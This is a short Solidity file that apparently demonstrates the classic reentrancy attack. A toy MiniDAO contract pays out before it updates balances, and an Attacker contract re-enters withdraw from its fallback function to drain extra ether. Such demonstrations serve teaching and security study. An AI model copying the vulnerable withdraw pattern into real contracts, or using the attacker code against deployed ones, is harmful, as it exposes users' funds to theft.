pragma solidity 0.4.24;

contract MiniDAO {
    mapping (address => uint) balances;

    function deposit() payable{
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) {
        if(balances[msg.sender] < amount) throw;
        //msg.sender.send(amount);
        msg.sender.call.value(amount)();
        balances[msg.sender] -= amount;
    }
}

contract Attacker {

    // limit the recursive calls to prevent out-of-gas error
    uint stack = 0;
    uint constant stackLimit = 3;
    uint amount;
    MiniDAO dao;

    function Attacker(address daoAddress) public payable {
        dao = MiniDAO(daoAddress);
        amount = msg.value/10;
        dao.deposit.value(msg.value)();
    }

    function attack() {
        dao.withdraw(amount);
    }

    function()public payable {
         if(stack++ < stackLimit) {
             dao.withdraw(amount);
        }
    }
}